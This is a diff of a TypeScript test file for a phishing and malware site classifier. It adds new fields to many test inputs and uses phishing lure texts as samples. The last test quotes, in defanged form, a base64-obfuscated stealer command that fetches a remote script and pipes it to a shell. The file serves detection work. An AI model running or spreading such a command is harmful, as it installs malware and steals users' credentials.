@@ -98,7 +98,7 @@ const tiktokCardFields = [
 function validateTikTokKit(collectionFieldRefs: unknown, evidenceQuote = "Phương thức thanh toán") {
 	// The production classifier returned this finding, basis, and quote for the kit.
 	return validateWebsiteSiteClassification(
-		{ finding: "phishing", phishingBasis: "payment_fraud", evidenceQuote, collectionFieldRefs, continuationRef: "" },
+		{ finding: "phishing", phishingBasis: "payment_fraud", evidenceQuote, collectionFieldRefs, continuationRef: "", hiddenFrameRef: "", mobileHandoff: false },
 		tiktokCoinKitArchive.text.toString("utf-8"),
 		tiktokCoinKitArchive.html.toString("utf-8"),
 	);
@@ -110,7 +110,7 @@ function capturedPage(url: string, text: string, html: string) {
 }
 
 function classify(page: ReturnType<typeof capturedPage>, response: Record<string, unknown>) {
-	return validateWebsiteSiteClassification({ collectionFieldRefs: [], continuationRef: "", ...response }, page.archive.text.toString("utf-8"), page.archive.html.toString("utf-8"));
+	return validateWebsiteSiteClassification({ collectionFieldRefs: [], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false, ...response }, page.archive.text.toString("utf-8"), page.archive.html.toString("utf-8"));
 }
 
 function reportablePage(page: ReturnType<typeof capturedPage>, classification: ReturnType<typeof classify>) {
@@ -191,8 +191,10 @@ test("classification covers lures and malware and lists fields beyond the HTML e
 			phishingBasis: { enum: ["credential_theft", "payment_fraud", "none"] },
 			collectionFieldRefs: { type: "array", items: { type: "string" } },
 			continuationRef: { type: "string" },
+			hiddenFrameRef: { type: "string" },
+			mobileHandoff: { type: "boolean" },
 		},
-		required: ["finding", "phishingBasis", "evidenceQuote", "collectionFieldRefs", "continuationRef"],
+		required: ["finding", "phishingBasis", "evidenceQuote", "collectionFieldRefs", "continuationRef", "hiddenFrameRef", "mobileHandoff"],
 	});
 });
 
@@ -247,7 +249,7 @@ test("a quote spanning several page lines keeps its text and drops the line brea
 	});
 	expect(validateTikTokKit(["f3"], "Mã thẻ\u0007")).toEqual({
 		finding: "insufficient_evidence",
-		rejectedClaim: "its evidence quote contains no page text",
+		rejectedClaim: "its evidence quote contains no text from the captured page text",
 	});
 });
 
@@ -281,7 +283,7 @@ test("quotes match despite typographic punctuation and invisible characters", ()
 		"PayPal\nYour account has been limited \u2014 \u201Cconfirm\u201D your Pay\u200BPal details to restore access.",
 		"<input type=\"password\">",
 	);
-	expect(classify(page, { finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "account has been limited - \"confirm\" your PayPal details", collectionFieldRefs: ["f1"], continuationRef: "" })).toMatchObject({
+	expect(classify(page, { finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "account has been limited - \"confirm\" your PayPal details", collectionFieldRefs: ["f1"], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false })).toMatchObject({
 		finding: "phishing",
 		collectionFields: [{ ref: "f1", control: "input[type=password]" }],
 	});
@@ -302,7 +304,7 @@ test("an overlong verbatim quote is kept as a bounded verbatim prefix", () => {
 
 test("short quotes in non-Latin scripts are valid evidence", () => {
 	expect(validateWebsiteSiteClassification(
-		{ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "请输入密码", collectionFieldRefs: ["f2"], continuationRef: "" },
+		{ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "请输入密码", collectionFieldRefs: ["f2"], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false },
 		"中国银行\n账号\n请输入密码\n登录",
 		'<div class="login"><input name="account"><input type="password" aria-label="密码"></div>',
 	)).toEqual({
@@ -322,7 +324,7 @@ test("a quote running from a heading into placeholder-only fields is verbatim pa
 </form></body></html>`);
 
 	expect(validateWebsiteSiteClassification(
-		{ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "Verificación Microsoft\nCorreo electrónico, teléfono o Skype\nContraseña de correo", collectionFieldRefs: ["f1", "f2"], continuationRef: "" },
+		{ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "Verificación Microsoft\nCorreo electrónico, teléfono o Skype\nContraseña de correo", collectionFieldRefs: ["f1", "f2"], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false },
 		text,
 		html,
 	)).toMatchObject({
@@ -333,24 +335,24 @@ test("a quote running from a heading into placeholder-only fields is verbatim pa
 });
 
 test("phishing claims without a harmful action or verbatim page evidence are not reported", () => {
-	expect(validateWebsiteSiteClassification({ finding: "prank_or_troll", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [], continuationRef: "" }, "You got trolled. Fuck you!", "<html></html>")).toEqual({ finding: "prank_or_troll" });
-	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "unrelated fabricated evidence", collectionFieldRefs: ["f1"], continuationRef: "" }, "You got trolled. Fuck you!", "<html><form><input type=\"password\"></form></html>")).toEqual({
+	expect(validateWebsiteSiteClassification({ finding: "prank_or_troll", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false }, "You got trolled. Fuck you!", "<html></html>")).toEqual({ finding: "prank_or_troll" });
+	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "unrelated fabricated evidence", collectionFieldRefs: ["f1"], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false }, "You got trolled. Fuck you!", "<html><form><input type=\"password\"></form></html>")).toEqual({
 		finding: "insufficient_evidence",
 		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
 	});
-	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "password asks to verify the unrelated account credentials".repeat(10), collectionFieldRefs: ["f1"], continuationRef: "" }, "password asks to verify the unrelated account credentials", "<html><form><input type=\"password\"></form></html>")).toEqual({
+	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "password asks to verify the unrelated account credentials".repeat(10), collectionFieldRefs: ["f1"], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false }, "password asks to verify the unrelated account credentials", "<html><form><input type=\"password\"></form></html>")).toEqual({
 		finding: "insufficient_evidence",
 		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
 	});
-	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "!", collectionFieldRefs: [], continuationRef: "" }, "Sign in!", "<input type=\"password\">")).toEqual({
+	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "!", collectionFieldRefs: [], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false }, "Sign in!", "<input type=\"password\">")).toEqual({
 		finding: "insufficient_evidence",
-		rejectedClaim: "its evidence quote contains no page text",
+		rejectedClaim: "its evidence quote contains no text from the captured page text",
 	});
-	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "none", evidenceQuote: "You got trolled. Fuck you!", collectionFieldRefs: [], continuationRef: "" }, "You got trolled. Fuck you!", "<html></html>")).toEqual({
+	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "none", evidenceQuote: "You got trolled. Fuck you!", collectionFieldRefs: [], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false }, "You got trolled. Fuck you!", "<html></html>")).toEqual({
 		finding: "insufficient_evidence",
 		rejectedClaim: "it named no credential theft or payment fraud",
 	});
-	expect(() => validateWebsiteSiteClassification({ finding: "suspicious", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [], continuationRef: "" }, "page text", "<html></html>")).toThrow("invalid finding");
+	expect(() => validateWebsiteSiteClassification({ finding: "suspicious", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false }, "page text", "<html></html>")).toThrow("invalid finding");
 	expect(() => validateWebsiteSiteClassification({ finding: "benign", phishingBasis: "none", evidenceQuote: "" }, "page text", "<html></html>")).toThrow("collection field references");
 });
 
@@ -387,7 +389,7 @@ test("a captured credential-collection page remains eligible for an exact-site p
 		finding: "phishing",
 		phishingBasis: "credential_theft",
 		evidenceQuote: "Confirm your delivery address and pay a redelivery fee.",
-		collectionFieldRefs: ["f1"], continuationRef: "",
+		collectionFieldRefs: ["f1"], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false,
 	}, archive.text.toString(), archive.html.toString());
 	const passwordField = { ref: "f1", control: "input[type=password]", name: "password" };
 	expect(classification).toEqual({
@@ -504,7 +506,7 @@ test("an invented-brand app site with a pasted stealer command is reported as ma
 	expect(finding).toEqual({ finding: "malware", evidenceQuote: paneoInstallCommand });
 	expect(reportablePage(paneo, finding)).toEqual(paneo.hop);
 
-	const evidence = buildWebsiteReportEvidence(finding, extractPasteCommands(paneo.archive.text.toString("utf-8")));
+	const evidence = buildWebsiteReportEvidence(finding, { commands: extractPasteCommands(paneo.archive.text.toString("utf-8")) });
 	const defanged = `: "brew install --cask paneo" [and] echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL29nWmhNSkI3RjI3NyB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' [pipe] base64 -d [pipe] zsh`;
 	expect(evidence.split("\n")).toEqual([
 		"The page distributes malware: it gets visitors to download, install, or run something that harms them.",
